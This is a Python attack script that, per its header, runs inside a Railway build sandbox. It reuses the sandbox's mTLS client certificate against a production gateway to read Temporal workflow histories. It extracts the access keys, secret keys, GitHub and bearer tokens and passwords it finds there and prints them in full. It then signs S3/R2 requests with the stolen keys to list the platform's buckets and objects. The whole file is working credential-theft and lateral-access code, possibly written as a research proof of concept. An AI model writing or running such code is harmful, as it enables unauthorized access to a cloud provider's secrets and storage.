#!/usr/bin/env python3
# I67851: extract platform object-storage credential VALUES from Temporal workflow
# inputs (read-only GetHistory) and then do read-only SigV4 enumeration (S3/R2).
# Runs INSIDE a Railway build sandbox that has /pki/{client.crt,client.key,server-ca-bundle.crt}
import subprocess, struct, json, sys, os, time, re, hmac, hashlib
import datetime, urllib.parse, http.client, ssl

G = 'https://external-mtls-service-gateway-us-west1.gcp.production.rlwy.net'
CA = '/pki/server-ca-bundle.crt'
CRT = '/pki/client.crt'
KEY = '/pki/client.key'
MARK = os.environ.get('MARK', 'I67851')
PHASE = (sys.argv[1] if len(sys.argv) > 1 else 'all')
CTR = [0]


def varint(n):
    out = bytearray()
    while True:
        b = n & 0x7f
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def fv(f, n):
    return varint(f << 3) + varint(n)


def fb(f, b):
    return varint((f << 3) | 2) + varint(len(b)) + b


def fs(f, s):
    return fb(f, s.encode() if isinstance(s, str) else s)


def fmsg(f, m):
    return fb(f, m)


def rd_varint(b, i):
    r = 0
    s = 0
    while i < len(b):
        x = b[i]
        r |= (x & 0x7f) << s
        i += 1
        if not x & 0x80:
            return r, i
        s += 7
        if s > 63:
            break
    raise ValueError('varint')


def parse(b):
    i = 0
    out = []
    while i < len(b):
        k, i = rd_varint(b, i)
        f = k >> 3
        w = k & 7
        if f == 0:
            raise ValueError('f0')
        if w == 0:
            v, i = rd_varint(b, i)
            out.append((f, 0, v))
        elif w == 2:
            l, i = rd_varint(b, i)
            if i + l > len(b):
                raise ValueError('len')
            out.append((f, 2, b[i:i + l]))
            i += l
        elif w == 5:
            out.append((f, 5, b[i:i + 4]))
            i += 4
        elif w == 1:
            out.append((f, 1, b[i:i + 8]))
            i += 8
        else:
            raise ValueError('wt%d' % w)
    return out


def all_of(b, field):
    try:
        return [v for f, w, v in parse(b) if f == field and w == 2]
    except Exception:
        return []


def get1(b, field):
    try:
        for f, w, v in parse(b):
            if f == field and w == 2:
                return v
    except Exception:
        return None
    return None


def grpc_call(path, body=b'', timeout=15, target=None, method='POST'):
    CTR[0] += 1
    n = CTR[0]
    fu = '/tmp/r%d.bin' % n
    hu = '/tmp/h%d.txt' % n
    bu = '/tmp/b%d.bin' % n
    tu = '/tmp/t%d.txt' % n
    framed = b'\x00' + struct.pack('>I', len(body)) + body
    open(fu, 'wb').write(framed)
    args = ['curl', '-sS', '--http2', '--connect-timeout', '4', '-m', str(timeout), '-D', hu, '-o', bu,
            '--trace-ascii', tu, '-w', '%{http_code}',
            '--cert', CRT, '--key', KEY, '--cacert', CA, '-X', method, G + path,
            '-H', 'te: trailers']
    if method == 'POST':
        args += ['-H', 'content-type: application/grpc', '--data-binary', '@' + fu]
    if target:
        args += ['-H', 'x-mpipe-target: ' + target]
    p = subprocess.run(args, capture_output=True, text=True)
    hdr = ''
    for f in (hu, tu):
        try:
            hdr += open(f, 'rb').read().decode('utf-8', 'replace')
        except Exception:
            pass
    sts = re.findall(r'grpc-status:\s*(\d+)', hdr)
    data = open(bu, 'rb').read() if os.path.exists(bu) else b''
    return {'http': p.stdout.strip(), 'st': (sts[-1] if sts else '-'), 'data': data,
            'err': (p.stderr or '').strip()[:120]}


def frame_payload(b):
    if len(b) >= 5 and b[0] == 0:
        l = struct.unpack('>I', b[1:5])[0]
        return b[5:5 + l]
    return b


json_re = re.compile(rb'\{"', re.S)


def jsons_from(b, lim=12):
    out = []
    i = 0
    while len(out) < lim:
        m = json_re.search(b, i)
        if not m:
            break
        s = m.start()
        depth = 0
        j = s
        inq = esc = False
        while j < len(b):
            c = b[j:j + 1]
            if inq:
                if esc:
                    esc = False
                elif c == b'\\':
                    esc = True
                elif c == b'"':
                    inq = False
            else:
                if c == b'"':
                    inq = True
                elif c == b'{':
                    depth += 1
                elif c == b'}':
                    depth -= 1
                    if depth == 0:
                        break
            j += 1
        if j < len(b) and 2 < j - s < 500000:
            try:
                out.append(json.loads(b[s:j + 1].decode('utf-8', 'replace')))
            except Exception:
                pass
        i = max(j, s + 2)
    return out


T = '/temporal.api.workflowservice.v1.WorkflowService/'
CREDS = []       # dicts with accessKey/secretKey
BUCKETS = set()
EXTRAS = []      # (tag, path, value)
SEEN = set()


def rel(path):
    p = path.lower()
    if p.endswith('.accesskey') or p.endswith('.secretkey'):
        return True
    if p.endswith('.bucketname') or p.endswith('.storetoken') or p.endswith('.storedtoken'):
        return True
    if p.endswith('.codeuri') or p.endswith('.objectpath') or p.endswith('.urischeme'):
        return True
    if p.endswith('.imageref') or p.endswith('.imagedigestref'):
        return True
    if ('credential' in p) and (p.endswith('.endpoint') or p.endswith('.username') or
                                p.endswith('.password') or p.endswith('.host') or p.endswith('.port')):
        return True
    if p.endswith('.githubtoken') or p.endswith('.bearertoken') or p.endswith('.githubbottoken'):
        return True
    return False


def walk(o, path, tag):
    if isinstance(o, dict):
        if 'accessKey' in o and 'secretKey' in o:
            CREDS.append({'path': path, 'accessKey': o.get('accessKey'),
                          'secretKey': o.get('secretKey'), 'endpoint': o.get('endpoint'),
                          'bucketName': o.get('bucketName'), 'tag': tag,
                          'objPath': o.get('objectPath'), 'uriScheme': o.get('uriScheme')})
        for k, v in o.items():
            p = (path + '.' + k) if path else k
            if rel(p) and isinstance(v, str):
                key = (p.split('.')[-1].lower(), v)
                if key not in SEEN:
                    SEEN.add(key)
                    EXTRAS.append((tag, p, v))
            if p.lower().endswith('bucketname') and isinstance(v, str) and v:
                BUCKETS.add(v)
            walk(v, p, tag)
    elif isinstance(o, list):
        for it in o[:4]:
            walk(it, path, tag)


def list_execs(ns_, q='', size=8):
    req = fs(1, ns_) + fv(2, size) + (fs(4, q) if q else b'')
    r = grpc_call(T + 'ListWorkflowExecutions', req, timeout=20)
    out = []
    if r['st'] != '0':
        return out, r['st']
    pl = frame_payload(r['data'])
    for ei in all_of(pl, 1):
        ex = get1(ei, 1) or b''
        wid = (get1(ex, 1) or b'').decode('utf-8', 'replace')
        rid = (get1(ex, 2) or b'').decode('utf-8', 'replace')
        ty = (get1(get1(ei, 2) or b'', 1) or b'').decode('utf-8', 'replace')
        if wid:
            out.append((wid, rid, ty))
    return out, '0'


def history(ns_, wid, rid, pages=2):
    tok = b''
    for _ in range(pages):
        req = fs(1, ns_) + fmsg(2, fs(1, wid) + (fs(2, rid) if rid else b'')) + fv(3, 20)
        if tok:
            req += fmsg(4, tok)
        r = grpc_call(T + 'GetWorkflowExecutionHistory', req, timeout=28)
        if r['st'] != '0':
            return None, r['st']
        pl = frame_payload(r['data'])
        yield pl
        tok = get1(pl, 5) or b''
        if not tok:
            break


print('===I67851 START %s phase=%s %s===' % (MARK, PHASE, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())), flush=True)
print('host=%s' % subprocess.run(['hostname'], capture_output=True, text=True).stdout.strip(), flush=True)
print('CERT=' + subprocess.run(['sh', '-c', 'openssl x509 -in %s -noout -subject 2>&1 | tr "\\n" " "' % CRT],
                              capture_output=True, text=True).stdout.strip(), flush=True)

# --- control ---
r = grpc_call(T + 'GetSystemInfo', b'')
print('CTL|GetSystemInfo|http=%s|st=%s|len=%d' % (r['http'], r['st'], len(r['data'])), flush=True)
if r['st'] != '0':
    print('ABORT control failed', flush=True)
    sys.exit(0)

# --- targets: gather in-scope workflows ---
targets = []
specs = [
    ('builds', 'WorkflowType="ScheduleSnapshotAndBuild"', 3),
    ('builds', 'WorkflowType="ScheduleBuildAndPublishImage"', 3),
    ('builds', 'WorkflowType="SnapshotAndBuild"', 2),
    ('vm-runtime', 'WorkflowType="CreateVmWorkflow"', 2),
]
for ns_, q, n in specs:
    ex, st = list_execs(ns_, q, n)
    print('LIST|%s|%s|st=%s|n=%d' % (ns_, q, st, len(ex)), flush=True)
    for e in ex[:n]:
        targets.append((ns_, e))

print('TARGETS=%d' % len(targets), flush=True)
done = 0
for ns_, (wid, rid, ty) in targets:
    if done >= 7:
        break
    got = False
    for pl in history(ns_, wid, rid, pages=1):
        js = jsons_from(pl, 12)
        n0 = len(CREDS)
        for j in js:
            walk(j, '', '%s/%s' % (ty[:24], wid[:24]))
        got = True
        print('H|%s|%s|len=%d|json=%d|newcreds=%d' % (ns_, ty[:30], len(pl), len(js), len(CREDS) - n0), flush=True)
        break
    if got:
        done += 1

print('===EXTRACT===', flush=True)
uniq = {}
for c in CREDS:
    k = (c['accessKey'], c['secretKey'], c.get('endpoint'))
    if k not in uniq:
        uniq[k] = c
print('CRED_OBJECTS=%d distinct=%d' % (len(CREDS), len(uniq)), flush=True)
i = 0
for k, c in uniq.items():
    i += 1
    print('C%d|path=%s|tag=%s' % (i, c['path'], c['tag']), flush=True)
    print('  AK|%s' % c['accessKey'], flush=True)
    print('  SK|%s' % c['secretKey'], flush=True)
    print('  EP|%s' % (c.get('endpoint') or ''), flush=True)
    print('  BN|%s' % (c.get('bucketName') or ''), flush=True)
    if c.get('objPath'):
        print('  OP|%s' % c['objPath'], flush=True)
for tag, p, v in EXTRAS[:24]:
    print('X|%s|%s|%s' % (tag[:18], p, v[:160]), flush=True)
print('BUCKETS=' + ','.join(sorted(BUCKETS))[:600], flush=True)

# --- SigV4 read-only enumeration ---
def sha256hex(b):
    return hashlib.sha256(b).hexdigest()


def sign(method, host, path, query, ak, sk, region='auto', payload_hash=None, extra=None):
    t = datetime.datetime.utcnow()
    amzdate = t.strftime('%Y%m%dT%H%M%SZ')
    datestamp = t.strftime('%Y%m%d')
    if payload_hash is None:
        payload_hash = sha256hex(b'')
    headers = {'host': host, 'x-amz-content-sha256': payload_hash, 'x-amz-date': amzdate}
    if extra:
        for k2, v2 in extra.items():
            headers[k2.lower()] = v2
    signed = sorted(headers)
    ch = ''.join('%s:%s\n' % (k2, str(headers[k2]).strip()) for k2 in signed)
    sh = ';'.join(signed)
    cq = '&'.join('%s=%s' % (urllib.parse.quote(str(k2), safe='-_.~'), urllib.parse.quote(str(v2), safe='-_.~'))
                  for k2, v2 in sorted(query.items()))
    cr = '\n'.join([method, path or '/', cq, ch, sh, payload_hash])
    scope = '%s/%s/s3/aws4_request' % (datestamp, region)
    sts = 'AWS4-HMAC-SHA256\n%s\n%s\n%s' % (amzdate, scope, sha256hex(cr.encode()))

    def H(k2, m):
        return hmac.new(k2, m.encode(), hashlib.sha256).digest()

    k = H(('AWS4' + sk).encode(), datestamp)
    k = H(k, region)
    k = H(k, 's3')
    k = H(k, 'aws4_request')
    sig = hmac.new(k, sts.encode(), hashlib.sha256).hexdigest()
    hh = dict(headers)
    hh['Authorization'] = 'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s' % (ak, scope, sh, sig)
    return hh


def s3req(host, method, path, query, ak, sk, region='auto', timeout=15):
    ctx = ssl.create_default_context()
    conn = http.client.HTTPSConnection(host, 443, timeout=timeout, context=ctx)
    hh = sign(method, host, path, query, ak, sk, region)
    url = path + ('?' + '&'.join('%s=%s' % (urllib.parse.quote(str(k2), safe='-_.~'),
                                            urllib.parse.quote(str(v2), safe='-_.~'))
                                 for k2, v2 in query.items()) if query else '')
    try:
        conn.request(method, url, headers=hh)
        resp = conn.getresponse()
        body = resp.read(200000)
        return resp.status, dict(resp.getheaders()), body
    except Exception as e:
        return -1, {}, str(e).encode()[:200]
    finally:
        try:
            conn.close()
        except Exception:
            pass


def parse_ep(ep):
    if not ep:
        return None, None
    e = ep.strip()
    if '://' not in e:
        e = 'https://' + e
    u = urllib.parse.urlparse(e)
    host = u.netloc
    base = u.path.rstrip('/')
    if ':' in host:
        host = host.split(':')[0]
    return host, base


print('===S3===', flush=True)
if uniq:
    for k, c in list(uniq.items())[:3]:
        ak, sk, ep = c['accessKey'], c['secretKey'], c.get('endpoint')
        host, base = parse_ep(ep)
        if not host:
            print('S3|skip no endpoint', flush=True)
            continue
        region = 'auto' if 'r2.cloudflarestorage.com' in host else 'us-east-1'
        print('S3EP|host=%s|base=%s|region=%s' % (host, base, region), flush=True)
        code, hd, body = s3req(host, 'GET', '/', {}, ak, sk, region)
        txt = body.decode('utf-8', 'replace')
        names = re.findall(r'<Name>([^<]+)</Name>', txt)
        print('LB|code=%s|buckets=%s|body=%s' % (code, ','.join(names)[:300], txt[:160].replace('\n', ' ')), flush=True)
        cand = sorted(BUCKETS) + sorted(c.get('bucketName') or '' for c in uniq.values())
        cand = [x for x in dict.fromkeys(cand) if x]
        if not cand and names:
            cand = names
        for b in cand[:8]:
            code, hd, body = s3req(host, 'GET', '/' + urllib.parse.quote(b), {'location': ''}, ak, sk, region)
            print('LOC|%s|code=%s|%s' % (b, code, body.decode('utf-8', 'replace')[:100].replace('\n', ' ')), flush=True)
        for b in cand[:8]:
            for prefix in ['', 'registry/', 'snapshots/', 'images/', 'vm/', 'builds/', 'backups/', 'platform/']:
                q = {'list-type': '2', 'max-keys': '100'}
                if prefix:
                    q['prefix'] = prefix
                code, hd, body = s3req(host, 'GET', '/' + urllib.parse.quote(b), q, ak, sk, region)
                txt = body.decode('utf-8', 'replace')
                keys = re.findall(r'<Key>([^<]+)</Key>', txt)
                sizes = re.findall(r'<Size>(\d+)</Size>', txt)
                trunc = '<IsTruncated>true</IsTruncated>' in txt
                print('LS|%s|pfx=%s|code=%s|n=%d|trunc=%s|%s' % (b, prefix, code, len(keys), trunc,
                      ';'.join('%s(%s)' % (kk[:60], sz) for kk, sz in list(zip(keys, sizes))[:12])[:700]), flush=True)
                if code == -1 or (code and code >= 400):
                    print('   ERR:%s' % txt[:140].replace('\n', ' '), flush=True)
                    break
                if keys:
                    break
print('===I67851 END %s===' % MARK, flush=True)
